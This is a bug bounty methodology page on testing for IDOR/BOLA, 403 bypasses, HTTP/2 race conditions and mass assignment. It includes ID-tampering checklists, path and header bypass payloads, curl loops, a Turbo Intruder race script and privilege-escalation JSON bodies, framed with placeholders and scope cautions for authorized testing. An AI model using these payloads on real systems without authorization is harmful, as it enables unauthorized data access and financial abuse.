---
title: "IDOR, BOLA, 403 Bypass & Race Conditions"
description: "Broken object level authorization, status code and path bypasses, HTTP/2 single-packet race conditions, and business logic abuse"
tags:
  - Bug Bounty
  - IDOR
  - BOLA
  - 403 Bypass
  - Race Condition
  - Business Logic
---

# IDOR / BOLA, 403 Bypass & Race Conditions

!!! note "What this page is doing"
    Authorization testing needs a pair: a caller and an object the caller should not control. Compare roles, tenants, methods and state transitions, then use concurrency only when a normal sequential test cannot answer the question.

---

## 1. IDOR / BOLA Hunting Methodology

**IDOR = every identifier your session can *reference*, but should not *control*.** Map every object reference and test it with two accounts.

=== " Enumeration Checklist"

    ```text
    - Numeric IDs : /api/v1/invoice/1001 -> 1002, 1000, 999
    - UUID v1 (timestamp) : uuid v1 leaks MAC + time -> predict/bruteforce nearby UUIDs
    - UUID v4 : not guessable -> but check for UUID LEAKS (shared links, emails,
                               exports, invite links, PDF metadata, CSV exports)
    - Base64 "IDs" : eyJpZCI6MTMzN30= -> decode -> {"id":1337} -> tamper -> re-encode
    - Hashed IDs : MD5(user_id) -> crack, or look for bcrypt/CRC32 weak patterns
    - GraphQL node(id:) : base64("User:1337") -> decode + modify
    - Slug / username : /profile/john -> /profile/admin
    - Nested object IDs : {"org_id":1,"user_id":999} -> change only the SECOND one
    - Bulk endpoints : POST /api/users/bulk ["1","2","3"] -> add victim's ID
    - Exports / reports : /export?user_id=<VICTIM> (often missing the same check)
    - Multi-tenant headers : X-Org-Id: 1, X-Tenant: acme, X-Company-ID
    - HTTP methods : PATCH/PUT/DELETE may bypass the GET-only authz check
    - Response diffing : Compare 200 vs 403 vs 404 bodies for user objects.
    ```

=== " Parameter Pollution & Format Confusion"

First keep the request format valid, then change one representation at a time. The examples below are test cases, not a reason to send every variant to a production endpoint.

```http
GET /api/v1/users/<VICTIM_ID>/profile HTTP/1.1
Host: <DOMAIN>
Authorization: Bearer <TEST_TOKEN>
X-Org-Id: <YOUR_ORG_ID>
```

```text
# Duplicate query parameters: compare each order separately.
?user_id=<YOUR_ID>&user_id=<VICTIM_ID>
?user_id=<VICTIM_ID>&user_id=<YOUR_ID>

# Array/object coercion: send one format per request.
?user_id[]=<VICTIM_ID>
{"user_id": ["<YOUR_ID>", "<VICTIM_ID>"]}
{"user_id": {"id": "<VICTIM_ID>"}}

# Wildcard and empty values: useful only when the endpoint supports filtering.
user_id=*       | user_id=all       | user_id=       | user_id=null       | user_id=0
```

The secure result is consistent authorization for the object, regardless of representation. Record status, body fields, timing and side effects rather than treating a parser error as a bypass.

---

## 2. 403 / 401 Authorization Bypass Techniques

When you hit `403 Forbidden` on `/admin` or an internal API, don't give up — try these systematically (inspired by HowToHunt's **403 Bypass**):

```text
# Path representations to compare one at a time.
/admin/        /admin//       /./admin       /admin%20
/admin%09      /admin%00      /admin..        /%2fadmin
/admin%2f      /admin;        /Admin          /ADMIN
/admin.json    /admin.html    /admin.php      /..;/admin
/api/v1/Users  /api/v1/users/. /api/v1/users%20

# Headers to test only when the front-end/back-end trust boundary is in scope.
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
Referer: https://<DOMAIN>/admin
```

```bash
# Compare allowed HTTP methods without combining several methods into one
# invalid curl invocation. Save only status and size for the first pass.
for method in GET POST PUT PATCH DELETE OPTIONS; do
  curl --silent --output /dev/null \
    --write-out "$method %{http_code} %{size_download}\\n" \
    --request "$method" \
    "https://<DOMAIN>/admin"
done

# Compare content types only with a request body that the endpoint expects.
for content_type in \\
  'application/x-www-form-urlencoded' \\
  'application/json' \\
  'text/plain'; do
  curl --silent --output /dev/null \\
    --write-out "$content_type %{http_code}\\n" \\
    --request POST \\
    --header "Content-Type: $content_type" \\
    --data '<APPROVED_TEST_BODY>' \\
    "https://<DOMAIN>/admin"
done
```

```bash
# Automate the whole 403-bypass suite with a script (Kathan-style bypass list)
for p in "/.%2f" "/%2e/" "//" "/./" "/;/" "/%09" "/%00" "/..;/" "/%2e%2e/" ; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "https://<DOMAIN>${p}admin")
  echo "[$code] https://<DOMAIN>${p}admin"
done
```

---

## 3. Race Conditions (Limit Overrun & TOCTOU)

=== " HTTP/2 Single-Packet Attack"

    ```python
    # Turbo Intruder: send 30 parallel requests in ONE TCP packet (kills network jitter)
    # Use this for: coupon reuse, gift-card redemption, withdrawal limits, voting,
    # username registration, 2FA attempt counters, referral bonuses, invitation limits.

    def queueRequests(target, wordlists):
        engine = RequestEngine(endpoint='https://<DOMAIN>',
                               concurrentConnections=1,
                               engine=Engine.BURP2,
                               requestsPerConnection=100)
        # 1. Warm-up request (triggers connection + session setup)
        engine.queue(target.req, gate='warmup')
        for i in range(30):
            engine.queue(target.req, target.baseInput, gate='race')
        engine.openGate('warmup')
        engine.openGate('race')

    def handleResponse(req, interesting):
        table.add(req)
    ```

=== " High-Value Race Targets"

    ```text
    - Redeem coupon / promo code N times (limit bypass)
    - Withdraw balance / transfer funds exceeding available amount (negative balance)
    - Add the same item multiple times to a cart with a single-use discount
    - Register username before the uniqueness check completes (account squatting)
    - Bypass "one free trial per user" by firing parallel subscription requests
    - Exceed API quota / OTP attempt counters
    - Multiple "invite member" calls exceeding the seat limit
    - File upload + processing race (upload a file, then race the antivirus scan)
    - Two-step verification race: verify AND change email simultaneously
    ```

---

## 4. Business Logic & Mass Assignment

Test one field or state transition at a time with a dedicated test account. The goal is to see whether the server ignores, rejects or applies a field the caller is not allowed to control.

```http
POST /api/v1/register HTTP/1.1
Host: <DOMAIN>
Authorization: Bearer <TEST_TOKEN>
Content-Type: application/json

{
  "email": "<TEST_EMAIL>",
  "password": "<TEST_PASSWORD>",
  "role": "admin",
  "is_admin": true,
  "verified": true
}
```

```json
{
  "role": "superadmin",
  "permissions": ["<APPROVED_TEST_PERMISSION>"],
  "plan": "enterprise",
  "tenant_id": "<TEST_TENANT_ID>"
}
```

Keep a property wordlist for review, but do not submit every field blindly:

```text
role | roles | admin | is_admin | isAdmin | user_type | account_type
plan | tier | verified | email_verified | active | status | credits
balance | org_id | tenant_id | permissions | scopes | groups | mfa_enabled
password_reset_required
```

Other state questions to model and test with harmless values:

```text
- Does a negative, zero or very large quantity change the price or balance?
- Can a multi-step checkout, refund or approval step be skipped or replayed?
- Can a coupon, trial, referral or seat limit be used more than once?
- Does currency conversion or decimal rounding change the expected result?
- Does changing a role or plan leave old privileges behind after downgrade?
```

A secure server rejects fields the caller does not control and enforces the state transition server-side. Document the before/after values and stop before creating real financial, account or data impact.